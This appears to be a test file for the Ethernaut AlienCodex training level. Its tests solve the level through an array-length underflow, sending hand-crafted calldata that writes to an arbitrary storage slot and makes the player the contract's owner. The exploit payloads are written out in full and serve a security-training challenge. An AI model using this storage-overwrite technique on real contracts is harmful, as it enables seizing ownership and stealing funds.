const AlienCodex = artifacts.require('./levels/AlienCodex.sol')
const AlienCodexFactory = artifacts.require('./levels/AlienCodexFactory.sol')

const Ethernaut = artifacts.require('./Ethernaut.sol')

import * as utils from '../utils/TestUtils'
import expectThrow from 'zeppelin-solidity/test/helpers/expectThrow'
import toPromise from 'zeppelin-solidity/test/helpers/toPromise'

contract('AlienCodex', function(accounts) {

  let ethernaut
  let level
  let instance
  let owner = accounts[1]
  let player = accounts[0]

  before(async function() {
    ethernaut = await Ethernaut.new();
    level = await AlienCodexFactory.new()
    await ethernaut.registerLevel(level.address)
    instance = await utils.createLevelInstance(
      ethernaut, level.address, player, AlienCodex,
      {from: player}
    )
  });

  describe('instance', function() {

    it('should not be immediately solvable', async function() {

      assert.notEqual(player, owner);
      let status = await instance.contact.call();
      assert.isFalse(status);
    }) 

    it('should allow the user to join AlienCodex, with arbitrary length', async function() {

      let _data = '0x1d3d4c0b0000000000000000000000000000000000000000000000000000000000000020F0000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000005';
      await toPromise(web3.eth.sendTransaction)({
        from: player,
        to: instance.address,
        data: _data
      })
      
      let status = await instance.contact.call();
      assert.isTrue(status);
    });

    it('codex array should underflow, giving user all storage access to become owner', async function() {
      
      await instance.pop();
      let _data = `0xe537637d4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a000000000000000000000001`+ player.substr(2);
      await toPromise(web3.eth.sendTransaction)({
        from: player,
        to: instance.address,
        data: _data
      })
    
      let ownr = await instance.owner();
      assert.equal(ownr, player);

    })
  });
});